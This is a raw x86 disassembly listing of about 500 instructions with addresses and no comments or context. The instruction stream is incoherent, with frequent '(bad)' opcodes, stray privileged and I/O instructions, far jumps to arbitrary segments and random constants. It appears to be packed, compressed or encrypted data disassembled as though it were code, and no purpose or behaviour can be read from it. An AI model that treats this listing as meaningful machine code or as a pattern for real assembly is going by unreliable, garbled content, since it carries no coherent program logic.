  4414d8:	sbb    BYTE PTR [edi+0x1ec9855b],al
  4414de:	xor    ah,BYTE PTR [ecx+0x17bc0a5e]
  4414e4:	(bad)  
  4414e5:	in     eax,dx
  4414e6:	xor    al,0x2a
  4414e8:	stc    
  4414e9:	mov    BYTE PTR [edi-0x73],dl
  4414ec:	sahf   
  4414ed:	nop
  4414ee:	aad    0xca
  4414f0:	xor    BYTE PTR [edx+ecx*8+0x7e],bh
  4414f4:	adc    al,bl
  4414f6:	inc    ecx
  4414f7:	jnp    0x4414e7
  4414f9:	push   eax
  4414fb:	jl     0x4414ed
  4414fd:	fnstsw WORD PTR [eax-0x26]
  441500:	(bad)  
  441501:	aas    
  441502:	push   ss
  441503:	adc    DWORD PTR [eax],esi
  441505:	inc    ebx
  441506:	adc    ecx,DWORD PTR [edi-0x363ab5e2]
  44150c:	mov    ds:0xaf819a77,eax
  441511:	data16 jl 0x44153f
  441514:	push   ebp
  441515:	imul   ebp,DWORD PTR cs:[ebx-0x379637c7],0xffffffa2
  44151d:	addr16 sbb eax,0xcb0a31f1
  441523:	div    BYTE PTR [edi-0x4d]
  441526:	push   ds
  441527:	sbb    eax,0x3c0ef439
  44152c:	xchg   esi,eax
  44152d:	push   ecx
  44152e:	rsm    
  441530:	fcmovb st,st(3)
  441532:	or     edx,DWORD PTR [eax+edi*4+0x2ac9967f]
  441539:	mov    ecx,0xae58634c
  44153e:	adc    bh,BYTE PTR [ecx]
  441540:	pop    ebx
  441541:	add    al,0xbb
  441543:	push   edx
  441544:	int    0xd3
  441546:	sbb    DWORD PTR [esi],esp
  441548:	add    bh,BYTE PTR [bp-0x67]
  44154c:	cmc    
  44154d:	aad    0xcd
  44154f:	jp     0x441557
  441551:	out    0x5f,eax
  441553:	and    eax,0x6b3902b0
  441558:	jno    0x44152c
  44155a:	mov    edi,0xad1bb382
  44155f:	dec    esi
  441560:	imul   esi,DWORD PTR [edi+0x18],0x3b
  441564:	push   esi
  441565:	addr16 or eax,0x5c7350b7
  44156b:	pop    esi
  44156c:	je     0x441526
  44156e:	pop    ds
  44156f:	scas   al,BYTE PTR es:[edi]
  441570:	inc    esi
  441571:	mov    bl,0x8a
  441573:	add    ch,ah
  441575:	call   0xd02bead8
  44157a:	ret    
  44157b:	fist   DWORD PTR [edi+0xf]
  44157e:	or     eax,0xc365cae3
  441583:	test   al,0x71
  441585:	(bad)  
  441586:	aam    0xd7
  441588:	sub    eax,DWORD PTR [esi]
  44158a:	sbb    dh,BYTE PTR [esi]
  44158c:	ins    BYTE PTR es:[edi],dx
  44158d:	daa    
  44158e:	push   eax
  44158f:	mov    ah,0x68
  441591:	pop    esp
  441592:	cli    
  441593:	fcmovnu st,st(2)
  441595:	pop    ebp
  441596:	ror    edx,0x7e
  441599:	mov    cl,0xdc
  44159b:	mov    ecx,0x67071195
  4415a0:	cs pop ss
  4415a2:	add    DWORD PTR [ebp+0x2cf00c49],0x4a
  4415a9:	adc    eax,0xb07c8e25
  4415ae:	stos   DWORD PTR es:[edi],eax
  4415af:	mov    ecx,0xe4485763
  4415b4:	push   edi
  4415b5:	sti    
  4415b6:	sbb    BYTE PTR [eax],0x85
  4415b9:	mov    ?,ebx
  4415bb:	lock ja 0x4415be
  4415be:	adc    edi,0x7a
  4415c1:	(bad)
  4415c5:	pop    ebx
  4415c6:	fsub   st(2),st
  4415c8:	jns    0x4415f6
  4415ca:	mov    ch,BYTE PTR [edx]
  4415cc:	sub    DWORD PTR ds:0xcbc57d00,ebx
  4415d2:	ss push edx
  4415d4:	pop    es
  4415d5:	fsub   DWORD PTR [edi+0x4ff8fbed]
  4415db:	mov    ebx,0xe1806923
  4415e0:	push   0x1a343d50
  4415e5:	stos   DWORD PTR es:[edi],eax
  4415e6:	in     al,dx
  4415e7:	mov    edi,0xbb3efd8a
  4415ec:	aas    
  4415ed:	sub    DWORD PTR [ecx+0x57c8a03a],ebp
  4415f3:	fbstp  TBYTE PTR [ebp-0xf]
  4415f6:	push   ebp
  4415f7:	add    eax,0x614245c0
  4415fc:	cmpps  xmm4,XMMWORD PTR [ecx+0x1d],0x97
  441601:	cli    
  441602:	sti    
  441603:	dec    ebp
  441604:	sbb    cl,BYTE PTR [eax]
  441606:	jne    0x441598
  441608:	inc    ecx
  441609:	jbe    0x4415ce
  44160b:	push   eax
  44160c:	jns    0x4415f1
  44160e:	push   esp
  44160f:	loopne 0x4415e3
  441611:	sar    BYTE PTR [ecx-0x40],cl
  441614:	sub    edi,DWORD PTR [edi]
  441616:	fst    DWORD PTR [ecx+0xb]
  441619:	lods   eax,DWORD PTR ds:[esi]
  44161a:	and    eax,0xef145ad4
  44161f:	into   
  441620:	(bad)  
  441621:	mov    esp,0xc7a36193
  441626:	test   al,0x90
  441628:	pop    ss
  441629:	das    
  44162a:	gs inc edi
  44162c:	cmp    ecx,DWORD PTR [edi]
  44162e:	neg    DWORD PTR [ecx+0x4d127f00]
  441634:	pop    edi
  441635:	inc    esp
  441636:	ret    
  441637:	xchg   ecx,eax
  441638:	or     BYTE PTR [ebx],0x72
  44163b:	sub    esp,edx
  44163d:	popf   
  44163e:	jle    0x44162c
  441640:	cmp    cl,bh
  441642:	imul   edi,DWORD PTR [ecx+0x1],0xffffff97
  441646:	outs   dx,DWORD PTR ds:[esi]
  441647:	scas   al,BYTE PTR es:[di]
  441649:	adc    BYTE PTR [edi-0x15b0356e],0x76
  441650:	das    
  441651:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  441652:	dec    ebx
  441653:	inc    edi
  441654:	add    esp,DWORD PTR [eax]
  441656:	pop    ebp
  441657:	mov    bh,0xb8
  441659:	idiv   BYTE PTR [ebx+edi*8-0x3a]
  44165d:	mov    esi,0x5b565d4a
  441662:	neg    BYTE PTR [ebp-0x79]
  441665:	mov    ebx,0x7ef3435a
  44166a:	cmp    esi,DWORD PTR [edx+0x37]
  44166d:	sar    BYTE PTR [edi],cl
  44166f:	mov    esi,0xbc490066
  441674:	add    BYTE PTR [edi],ah
  441676:	xor    al,0xfa
  441678:	das    
  441679:	mov    al,ds:0xcb71010d
  44167e:	stos   BYTE PTR es:[edi],al
  44167f:	(bad)  
  441680:	xchg   ecx,eax
  441681:	jecxz  0x441642
  441683:	add    edx,ecx
  441685:	add    eax,0x6f728610
  44168a:	or     al,0xed
  44168c:	out    0x72,eax
  44168e:	inc    esi
  44168f:	test   BYTE PTR fs:[esi],bh
  441692:	mov    ebp,0xc11b5079
  441697:	pop    ds
  441698:	add    al,0x77
  44169a:	int    0x59
  44169c:	cmp    al,0x8b
  44169e:	push   ss
  44169f:	mov    ecx,0x7de9a54d
  4416a4:	xor    eax,0x517ea650
  4416a9:	adc    dh,BYTE PTR [ebp+ebp*4-0x6605f0d4]
  4416b0:	out    0x50,eax
  4416b2:	mov    ds:0x9c923bf7,eax
  4416b7:	adc    al,0x10
  4416b9:	sbb    eax,0xf794b3cf
  4416be:	imul   esi,ecx,0x51abce5d
  4416c4:	mov    ebx,0xda84ff60
  4416c9:	outs   dx,DWORD PTR ds:[esi]
  4416ca:	xor    BYTE PTR [eax+edi*4+0x4c],bh
  4416ce:	in     al,0x38
  4416d0:	xor    BYTE PTR [edx],ch
  4416d2:	das    
  4416d3:	in     eax,0x17
  4416d5:	xlat   BYTE PTR ds:[ebx]
  4416d6:	imul   ebx,DWORD PTR ds:0x674ba6c0,0x4
  4416dd:	add    bl,BYTE PTR [ebx+0x1503e056]
  4416e3:	outs   dx,BYTE PTR ds:[esi]
  4416e4:	or     BYTE PTR [edx-0x17],ah
  4416e7:	fldl2e 
  4416e9:	imul   ecx,DWORD PTR [esi+0x29],0x3bdd7d4a
  4416f0:	dec    esp
  4416f1:	adc    cl,bh
  4416f3:	and    DWORD PTR [eax-0x6cb2b61c],eax
  4416f9:	or     eax,0x81070585
  4416fe:	mov    dh,bh
  441700:	out    dx,al
  441701:	leave  
  441702:	xchg   ebx,eax
  441703:	and    al,0x24
  441705:	pop    esi
  441706:	repnz sar esp,0xfd
  44170a:	pop    ebx
  44170b:	and    DWORD PTR [eax+eiz*8],ebx
  44170e:	enter  0xc0,0x6e
  441712:	dec    esi
  441713:	mov    ds:0xf09bb6d4,eax
  441718:	mov    WORD PTR [eax-0x8],cs
  44171b:	or     edi,DWORD PTR [edx+0x142058be]
  441721:	mov    ds:0xbb66ef7b,eax
  441726:	mov    dh,0x10
  441728:	push   DWORD PTR [eax-0x782e801c]
  44172e:	(bad)  
  44172f:	mov    ch,0x98
  441731:	sub    edx,DWORD PTR [edx]
  441733:	mov    al,ds:0x6779d3ed
  441738:	xor    DWORD PTR [esi-0x3a],0xfffffff8
  44173c:	cs jp  0x441732
  44173f:	lds    esi,FWORD PTR [eax+eiz*4]
  441742:	out    dx,al
  441743:	stos   DWORD PTR es:[edi],eax
  441744:	shl    BYTE PTR [edi+0x42e00f91],0x62
  44174b:	xchg   BYTE PTR [esi],cl
  44174d:	xchg   ecx,eax
  44174e:	in     al,0x73
  441750:	push   eax
  441751:	call   0x4437:0xee36e812
  441758:	aas    
  441759:	retf   
  44175a:	jae    0x44178a
  44175c:	shl    DWORD PTR [edx+0x39fe9649],1
  441762:	pop    ebx
  441763:	shl    DWORD PTR [ebp+0x19],0x6e
  441767:	das    
  441768:	ins    DWORD PTR es:[edi],dx
  441769:	scas   eax,DWORD PTR es:[edi]
  44176a:	es xor al,0x2d
  44176d:	fdivr  DWORD PTR ds:0xf0feaa23
  441773:	lods   al,BYTE PTR ds:[esi]
  441774:	push   esi
  441775:	in     eax,0xc9
  441777:	imul   esi,DWORD PTR [ebx+0x6469c06c],0xf8935539
  441781:	cs xchg edi,eax
  441783:	rol    DWORD PTR ss:[ebx-0x2cdb8c9e],1
  44178a:	fist   DWORD PTR [ebx-0x735f6c06]
  441790:	mov    eax,0xc1b5b25b
  441795:	rcl    bl,1
  441797:	das    
  441798:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  441799:	mov    DWORD PTR [eax+0x724da5a0],esp
  44179f:	cmc    
  4417a0:	hlt    
  4417a1:	fwait
  4417a2:	in     al,dx
  4417a3:	jge    0x4417f3
  4417a5:	ins    DWORD PTR es:[di],dx
  4417a7:	lahf   
  4417a8:	lods   al,BYTE PTR ds:[esi]
  4417a9:	(bad)  
  4417aa:	jge    0x441776
  4417ac:	jno    0x4417cc
  4417ae:	pop    es
  4417af:	(bad)  
  4417b0:	and    eax,0x9dcb3b39
  4417b5:	aaa    
  4417b6:	xor    edx,edi
  4417b8:	clc    
  4417b9:	js     0x44174c
  4417bb:	lods   eax,DWORD PTR ds:[esi]
  4417bc:	inc    eax
  4417bd:	adc    eax,0x67f2c622
  4417c2:	add    al,0xa3
  4417c4:	xlat   BYTE PTR ds:[ebx]
  4417c5:	call   0x8928:0x765c3482
  4417cc:	add    al,0x5c
  4417ce:	xchg   BYTE PTR [esi+0x1c],ah
  4417d1:	xor    al,0x40
  4417d3:	outs   dx,DWORD PTR ds:[esi]
  4417d4:	pop    esi
  4417d5:	sahf   
  4417d6:	outs   dx,BYTE PTR ds:[esi]
  4417d7:	ficomp DWORD PTR [edx+eax*1-0x191b85a5]
  4417de:	les    edx,FWORD PTR [edx-0x63]
  4417e1:	out    0xe5,al
  4417e3:	push   ss
  4417e4:	mov    BYTE PTR [ebx-0x3e055808],cl
  4417ea:	adc    esp,esp
  4417ec:	mov    dh,0x33
  4417ee:	shr    DWORD PTR [edx-0x49],0x3e
  4417f2:	push   ds
  4417f3:	add    BYTE PTR [edx],bh
  4417f5:	daa    
  4417f6:	cli    
  4417f7:	jl     0x441870
  4417f9:	cdq    
  4417fa:	cli    
  4417fb:	leave  
  4417fc:	mov    eax,ds:0x157aaff
  441801:	cli    
  441802:	idiv   BYTE PTR [esi-0x62803400]
  441808:	test   al,0x2b
  44180a:	stos   BYTE PTR es:[edi],al
  44180b:	pusha  
  44180c:	(bad)  
  44180d:	and    al,0xd2
  44180f:	xor    al,0x2b
  441811:	pusha  
  441812:	pop    ds
  441813:	fld    QWORD PTR [ecx*4-0x3d0ae534]
  44181a:	stos   BYTE PTR es:[edi],al
  44181b:	ja     0x441886
  44181d:	scas   al,BYTE PTR es:[edi]
  44181e:	dec    ebp
  44181f:	push   ecx
  441820:	ss sahf 
  441822:	std    
  441823:	jns    0x4417e5
  441825:	stos   BYTE PTR es:[edi],al
  441826:	fisttp WORD PTR [ecx]
  441828:	mov    al,ds:0x5466635b
  44182d:	dec    ebp
  44182e:	inc    esp
  44182f:	xor    cl,BYTE PTR [edi+eax*8]
  441832:	jp     0x441853
  441834:	and    bh,BYTE PTR [eax+ecx*1+0x44f74168]
  44183b:	push   edx
  44183c:	nop
  44183d:	rcl    DWORD PTR [edi*4+0x45f3ee9e],cl
  441844:	shl    BYTE PTR [edi+eiz*2+0x759a275a],cl
  44184b:	xchg   DWORD PTR [edx+0x70],ecx
  44184e:	jg     0x4418c7
  441850:	xor    ah,BYTE PTR [ebx+0x47ef1588]
  441856:	jmp    0x6a06:0x203cd590
  44185d:	in     eax,dx
  44185e:	and    esi,DWORD PTR [eax+0x7a]
  441861:	daa    
  441862:	mov    ebp,0xfc1fcdfe
  441867:	and    ebx,DWORD PTR [esi-0x4daa0b86]
  44186d:	jo     0x441852
  44186f:	mov    DWORD PTR [eax-0x4],edx
  441872:	adc    bh,BYTE PTR [eax+0x3d4ab2fe]
  441878:	jnp    0x4417ff
  44187a:	mov    ebp,DWORD PTR ds:0x3a76545a
  441880:	sub    ebx,DWORD PTR ds:0xd0921889
  441886:	cmc    
  441887:	inc    esp
  441888:	sahf   
  441889:	sub    edi,DWORD PTR [esi+0x61]
  44188c:	or     al,BYTE PTR [ecx]
  44188e:	pop    ss
  44188f:	out    0x13,al
  441891:	test   ch,bl
  441893:	lahf   
  441894:	or     DWORD PTR [esi+0x61],ebx
  441897:	ins    BYTE PTR es:[edi],dx
  441898:	ret    
  441899:	call   FWORD PTR [edi+0x73]
  44189c:	dec    esp
  44189d:	inc    esp
  44189e:	loopne 0x44188a
  4418a0:	call   0xf7f3:0xa7edd4aa
  4418a7:	aam    0x4e
  4418a9:	fimul  DWORD PTR [esi+0x628e7144]
  4418af:	xchg   DWORD PTR [ebp-0x4eeaa17],edx
  4418b5:	inc    esp
  4418b6:	mov    esi,0xae95eaf8
  4418bb:	mov    ecx,0xe595bdc9
  4418c0:	dec    esp
  4418c1:	xor    al,0x8b
  4418c3:	aaa    
  4418c4:	repz push edx
  4418c6:	push   ds
  4418c7:	jl     0x441864
  4418c9:	retf   
  4418ca:	sbb    DWORD PTR [esi-0x1],eax
  4418cd:	sbb    BYTE PTR [edx+0x3083d554],dl
  4418d3:	dec    eax
  4418d4:	inc    ebx
  4418d5:	addr16 jmp 0x2cdc:0xf8509ab4
  4418dd:	dec    ecx
  4418de:	and    eax,0x9267cacd
  4418e3:	mov    bl,0x7
  4418e5:	enter  0xe163,0x71
  4418e9:	in     al,dx
  4418ea:	jge    0x441932
  4418ec:	icebp  
  4418ed:	leave  
  4418ee:	out    dx,eax
  4418ef:	imul   ebx,DWORD PTR [esi-0x5],0xffffffa7
  4418f3:	jns    0x441911
  4418f5:	dec    edi
  4418f6:	cmp    eax,0x37616990
  4418fb:	push   esp
  4418fc:	bound  eax,QWORD PTR [esi]
  4418fe:	mov    edx,0xa9ca8a56
  441903:	shl    DWORD PTR [edi-0x92e553e],1
  441909:	imul   edi,DWORD PTR [eax+eax*1-0x4679f3a1],0x5e
  441911:	cmp    dl,ch
  441913:	sub    eax,0x6ab8df0c
  441918:	cdq    
  441919:	or     BYTE PTR [ebx],cl
  44191b:	ins    DWORD PTR es:[edi],dx
  44191c:	xchg   esp,eax
  44191d:	clc    
  44191e:	repnz ins DWORD PTR es:[edi],dx
  441920:	sub    BYTE PTR [ebp+ebx*2+0x43e4ac0c],0x9c
  441928:	outs   dx,DWORD PTR ds:[esi]
  441929:	inc    ebp
  44192a:	xor    al,0x6d
  44192c:	stos   BYTE PTR es:[edi],al
  44192d:	dec    edi
  44192e:	and    edx,DWORD PTR [ebx]
  441930:	xchg   esi,eax
  441931:	add    BYTE PTR [ebp-0x17],al
  441934:	jge    0x4418e9
  441936:	(bad)  
  441938:	int    0x86
  44193a:	push   ds
  44193b:	push   ecx
  44193c:	mov    al,ds:0x463ec3f5
  441941:	lock dec ecx
  441943:	je     0x441949
  441945:	mov    ds:0x9b84865c,eax
  44194a:	dec    esi
  44194b:	add    esp,DWORD PTR [edx+0x5]
  44194e:	xchg   esp,eax
  44194f:	(bad)  
  441951:	mov    esp,0x595ca305
  441956:	sbb    al,cl
  441958:	je     0x441928
  44195a:	mov    ch,0xca
  44195c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44195d:	push   cs
  44195e:	xchg   BYTE PTR [esi],ah
  441960:	iret   
  441961:	add    ch,dl
  441963:	add    al,0xc8
  441965:	retf   
  441966:	inc    edi
  441967:	aam    0xd1
  441969:	pop    esi
  44196a:	adc    BYTE PTR [ebx-0x6c614bc],cl
  441970:	xchg   esi,eax
  441971:	rol    BYTE PTR [eax+0x63],cl
  441974:	xlat   BYTE PTR ds:[ebx]
  441975:	loop   0x4419f4
  441977:	std    
  441978:	jecxz  0x441937
  44197a:	ret    
  44197b:	pop    ecx
  44197c:	out    dx,eax
  44197d:	sbb    DWORD PTR [eax+ebp*2+0x553fe075],edi
  441984:	xchg   ebp,eax
  441985:	retf   
  441986:	adc    BYTE PTR [ebx-0x66003398],dh
  44198c:	add    al,0x91
  44198e:	cmp    DWORD PTR [esi],ebx
  441990:	jmp    0xcf30:0x88871f7e
  441997:	mov    ds:0x10aff851,al
  44199c:	stc    
  44199d:	leave  
  44199e:	xchg   BYTE PTR [esi+0x6a],bl
  4419a1:	cli    
  4419a2:	ror    DWORD PTR [edi+edi*8],1
  4419a5:	xchg   ebx,eax
  4419a6:	mov    ebp,0xc872dfd1
  4419ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4419ac:	out    0x8d,eax
  4419ae:	std    
  4419af:	mov    al,0x68
  4419b1:	jne    0x4419c2
  4419b3:	jbe    0x4419ca
  4419b5:	jecxz  0x44193d
  4419b7:	mov    edi,0x71f6207d
  4419bc:	mov    esp,0xc84b610d
  4419c1:	dec    eax
  4419c2:	data16 xlat BYTE PTR ds:[ebx]
  4419c4:	mov    ds:0xa8c9efed,eax
  4419c9:	dec    ecx
  4419ca:	and    BYTE PTR [edi],0x58
  4419cd:	sbb    al,0xc6
  4419cf:	rcr    esp,cl
  4419d1:	or     al,0xa9
  4419d3:	adc    bh,BYTE PTR [eax-0x3db010dc]
  4419d9:	mov    cl,0x49
  4419db:	fisttp DWORD PTR [edi+0x5f]
  4419de:	jbe    0x441a5f
  4419e0:	retf   
  4419e1:	jmp    0x441a59
  4419e3:	in     al,dx
  4419e4:	sbb    BYTE PTR [ecx+0x31],al
  4419e7:	call   0x867a:0xe8ae32a0
  4419ee:	and    al,bl
  4419f0:	in     al,0x67
  4419f2:	jb     0x44198a
  4419f4:	nop
  4419f5:	xchg   BYTE PTR [esi+0x7657e941],cl
  4419fb:	jmp    0x4419f7
  4419fd:	lea    eax,[edi-0x68e931f8]
  441a03:	xchg   edx,eax
  441a04:	xor    esp,ecx
  441a06:	fdivrp st(1),st
  441a08:	add    ecx,esi
  441a0a:	test   BYTE PTR ds:0x6999d895,0xfc
  441a11:	lock xchg ebx,eax
  441a13:	loopne 0x4419cb
  441a15:	hlt    
  441a16:	fs loop 0x4419c6
  441a19:	adc    BYTE PTR [edi-0x70d79e3f],ch
  441a1f:	mov    WORD PTR [edx-0x6f],ds
  441a22:	icebp  
  441a23:	xchg   ebx,eax
  441a24:	(bad)  
  441a25:	aad    0xca
  441a27:	adc    bl,cl
  441a29:	pop    ebp
  441a2a:	in     al,0x60
  441a2c:	bnd jb 0x441a03
  441a2f:	loopne 0x441aa9
  441a31:	jb     0x4419cf
  441a33:	stc    
  441a34:	jns    0x441a36
  441a36:	in     eax,dx
  441a37:	or     eax,0x8b7acc78
  441a3c:	call   0xdca7:0xfa2e78f1
  441a43:	aas    
  441a44:	mov    dh,0xe0
  441a46:	test   al,0x82
  441a48:	fisub  DWORD PTR [ecx+0x48]
  441a4b:	shr    BYTE PTR [ebx],cl
  441a4d:	lods   eax,DWORD PTR ds:[esi]
  441a4e:	cmp    DWORD PTR [edi],esp
  441a50:	test   eax,0x526fbe78
  441a55:	sti    
  441a56:	push   eax
  441a57:	push   ecx
  441a58:	mov    esi,DWORD PTR [esi+0x7ea00481]
  441a5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  441a5f:	pop    edi
  441a60:	push   0x3f
  441a62:	retf   0xfb4
  441a65:	pop    edx
  441a66:	retf   0x32d1
  441a69:	inc    edi
  441a6a:	pop    ebp
  441a6b:	jns    0x441a10
  441a6d:	sbb    BYTE PTR [ecx],0x3a
  441a70:	jne    0x441adf
  441a72:	inc    edi
  441a73:	outs   dx,DWORD PTR ds:[esi]
  441a74:	int    0xba
  441a76:	lea    edx,[ebx-0x5dc5aca3]
  441a7c:	imul   DWORD PTR [eax-0x6d4781e0]
  441a82:	xchg   ebx,eax
  441a83:	rol    DWORD PTR [edx+0x5071d1db],0xd
  441a8a:	mov    ebx,0xbb4a4222
  441a8f:	and    ecx,0xc3c53956
  441a95:	rdpmc  
  441a97:	hlt    
  441a98:	add    esp,DWORD PTR [ecx-0x2f]
  441a9b:	pop    ebx
  441a9c:	in     eax,0x88
  441a9e:	lar    ecx,WORD PTR ds:0xcd782f9a
  441aa5:	dec    ebx
  441aa6:	cmp    BYTE PTR [esp+ebp*1+0xb3da100],al
  441aad:	cmp    DWORD PTR [esi-0x48b4bb61],esp
  441ab3:	sbb    DWORD PTR [ebx+0xcd72643],esi
  441ab9:	(bad)  
  441aba:	mov    dl,0xb2
  441abc:	mov    esp,0xfd791133
  441ac1:	(bad)  
  441ac3:	mov    al,bh
  441ac5:	adc    bl,BYTE PTR [ecx*2+0xc2c0a1d]
  441acc:	sbb    BYTE PTR [eax-0x5bb9db4b],cl
  441ad2:	xchg   ebp,eax
  441ad3:	lock fdivr DWORD PTR [ebp+0x28bf2264]
  441ada:	jp     0x441b09
  441adc:	sti    
  441add:	jno    0x441b1c
  441adf:	inc    esp
  441ae0:	cmp    al,0x6
  441ae2:	retf   0x7fd6
  441ae5:	aam    0x67
  441ae7:	iret   
  441ae8:	lods   eax,DWORD PTR ds:[esi]
  441ae9:	xchg   ebx,eax
  441aea:	repnz push ebx
  441aec:	jb     0x441b1a
  441aee:	push   0xfffffff3
  441af0:	xchg   edi,eax
  441af1:	in     eax,0x55
  441af3:	jp     0x441af6
  441af5:	ins    BYTE PTR es:[edi],dx
  441af6:	sbb    DWORD PTR [ebx],ecx
  441af8:	push   0x44
  441afa:	cmp    esi,edx
  441afc:	push   esi
  441afd:	pop    ebp
  441afe:	cwde   
  441aff:	ret    
  441b00:	ja     0x441b1f
  441b02:	pop    ebx
  441b03:	sub    eax,0xd05caed2
  441b08:	sbb    eax,0xa1333ed2
  441b0d:	test   eax,0x3ef2e61a
  441b12:	sbb    al,0x9b
  441b14:	cdq    
  441b15:	(bad)  
  441b16:	ret    0x1b2d
  441b19:	cmp    dh,cl
  441b1b:	(bad)  
  441b1c:	pop    ss
  441b1d:	mov    edi,0xcf22d021
  441b22:	adc    eax,0xe9403be7
  441b27:	rol    BYTE PTR [edx+0x3e],cl
  441b2a:	and    esi,ecx
  441b2c:	jp     0x441b21
  441b2e:	push   es
  441b2f:	or     al,0x78
  441b31:	test   BYTE PTR [edi+ebx*4],al
  441b34:	sbb    ch,BYTE PTR [ecx]
  441b36:	cwde   
  441b37:	mov    esi,0x4e20a377
  441b3c:	rcl    DWORD PTR [edx],1
  441b3e:	push   eax
  441b3f:	jns    0x441afe
  441b41:	mov    bh,0xa8
  441b43:	mov    ds:0x44a83754,eax
  441b48:	lahf   
  441b49:	es ss daa 
  441b4c:	hlt    
  441b4d:	add    ch,BYTE PTR [esi-0x77]
  441b50:	std    
  441b51:	aad    0xec
  441b53:	rol    DWORD PTR [esi-0x7c],cl
  441b56:	jnp    0x441b53
  441b58:	repz je 0x441aec
  441b5b:	dec    ebx
  441b5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  441b5d:	xchg   BYTE PTR [eax+0x83948e6],ch
  441b63:	sub    BYTE PTR [esi+ecx*1+0x43],al
  441b67:	outs   dx,BYTE PTR ds:[esi]
  441b68:	enter  0x3253,0x96
  441b6c:	mov    dh,BYTE PTR ds:0x1aeb3117
  441b72:	and    DWORD PTR [ecx],ebx
  441b74:	mov    dl,BYTE PTR [ebx+0x37c23dfd]
  441b7a:	lock (bad) 
  441b7c:	or     eax,0x262edd58
  441b81:	daa    
  441b82:	test   al,0x8e
  441b84:	mov    esi,0x2a23c167
  441b89:	stc    
  441b8a:	jno    0x441b11
  441b8c:	mov    DWORD PTR [ebp-0x21],eax
  441b8f:	push   edi
  441b90:	fdivrp st(1),st
  441b92:	mov    eax,0x1ace2ef8
  441b97:	sbb    bh,0x7a
  441b9a:	jecxz  0x441ba3
  441b9c:	push   edx
  441b9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  441b9e:	es mov eax,0xd3436c38
  441ba4:	xchg   BYTE PTR [edx],bl
  441ba6:	test   BYTE PTR [esi+0x4d],dh
  441ba9:	outs   dx,BYTE PTR ds:[esi]
  441baa:	cmp    al,0x63
  441bac:	int3   
  441bad:	out    dx,al
  441bae:	outs   dx,DWORD PTR ds:[esi]
  441baf:	mov    bl,0x61
  441bb1:	adc    dl,BYTE PTR [edi-0xb]
  441bb4:	xlat   BYTE PTR ds:[ebx]
  441bb5:	pop    eax
  441bb6:	and    dl,cl
  441bb8:	jg     0x441c0a
  441bba:	jl     0x441b58
  441bbc:	adc    cl,bl
  441bbe:	ins    BYTE PTR es:[edi],dx
  441bbf:	xor    ebx,DWORD PTR [ebp-0x35]
  441bc2:	fucomip st,st(7)
  441bc4:	jmp    0xc5ae:0xc38d1363
  441bcb:	(bad)  
  441bcc:	loopne 0x441b56
  441bce:	xchg   esp,eax
  441bcf:	inc    edi
  441bd0:	dec    esi
  441bd1:	xor    ebx,ebp
  441bd3:	dec    esp
  441bd4:	xchg   edx,eax
  441bd6:	add    BYTE PTR [esi+0x6a17e966],ch
  441bdc:	jmp    0xe50d:0xaa2d2aea
  441be3:	in     al,dx
  441be4:	add    al,BYTE PTR ds:0x260b1f1d
  441bea:	loopne 0x441bdb
  441bec:	rcr    dh,cl
  441bee:	or     al,0x14
  441bf0:	jmp    FWORD PTR [edi-0x77]
  441bf3:	ss or  bh,bl
  441bf6:	inc    edx
  441bf7:	adc    BYTE PTR [ecx-0x63],cl
  441bfa:	inc    esi
  441bfb:	pop    ss
  441bfc:	or     esi,DWORD PTR [esi]
  441bfe:	cmp    cl,BYTE PTR [esi+eax*4+0x6a6b5039]
  441c05:	and    BYTE PTR [esi+ecx*4],dh
  441c08:	pop    esi
  441c09:	xchg   ebx,eax
  441c0a:	std    
  441c0b:	pop    ecx
  441c0c:	fisubr DWORD PTR [edx+0x11]
  441c0f:	std    
  441c10:	fisttp WORD PTR [ebp-0x12547c0b]
  441c16:	xlat   BYTE PTR ds:[ebx]
  441c17:	lods   al,BYTE PTR ds:[esi]
  441c18:	mov    ebx,0x1723ff1c
  441c1d:	push   ss
  441c1e:	loope  0x441bc6
  441c20:	jmp    0x9a5e4442
  441c25:	out    0x4f,eax
  441c27:	cmp    eax,0xc6de6161
  441c2c:	push   esi
  441c2d:	lds    edx,FWORD PTR [edx]
  441c2f:	dec    esp
  441c30:	adc    DWORD PTR [edi+0x2b],eax
  441c33:	mov    esi,0x744632de
  441c38:	imul   ebx,DWORD PTR [ebx+0x75735ae9],0xf1a7e5f
  441c42:	xor    edi,edi
  441c44:	ror    BYTE PTR [ebp+eiz*1-0x7a68b36e],0xe
  441c4c:	sub    al,0x8b
  441c4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  441c4f:	adc    ah,ch
  441c51:	mov    ah,0x5e
  441c53:	fwait
  441c54:	jle    0x441c53
  441c56:	iret   
  441c57:	mov    cl,0x25
  441c59:	popa   
  441c5a:	pusha  
  441c5b:	stos   BYTE PTR es:[edi],al
  441c5c:	arpl   WORD PTR [edi],ax
  441c5e:	xor    eax,0x9ed6a7ec
  441c63:	inc    edx
  441c64:	scas   eax,DWORD PTR es:[edi]
  441c65:	mov    ds:0x2de0699a,al
  441c6a:	or     bh,al
  441c6c:	fadd   QWORD PTR ds:0x26d20778
  441c72:	mov    WORD PTR [ebx+0x64],cs
  441c75:	(bad)  
  441c76:	out    dx,al
  441c77:	xchg   esp,eax
  441c78:	loopne 0x441c1c
  441c7a:	pop    esi
  441c7b:	ja     0x441c67
  441c7d:	(bad)  
  441c7e:	lds    edx,FWORD PTR [eax+0x76]
  441c81:	jnp    0x441c5a
  441c83:	push   eax
  441c84:	and    BYTE PTR [ecx+0x5f40ba54],bh
  441c8a:	dec    ecx
  441c8b:	aam    0xeb
  441c8d:	retf   
  441c8e:	mov    ds:0x63b951dd,eax
  441c93:	lods   al,BYTE PTR ds:[esi]
  441c94:	jb     0x441c29
  441c96:	mov    eax,DWORD PTR [eax+edi*1]
  441c99:	push   ebp
  441c9a:	dec    esp
  441c9b:	lock sbb dh,BYTE PTR [esi+0x1]
  441c9f:	jo     0x441ca0
  441ca1:	shl    eax,cl
  441ca3:	retf   0x3dfc
  441ca6:	gs adc eax,0x87b32351
  441cac:	cld    
  441cad:	mov    ch,0x5e
  441caf:	scas   eax,DWORD PTR es:[edi]
  441cb0:	adc    esi,DWORD PTR [ebx]
  441cb2:	jl     0x441c91
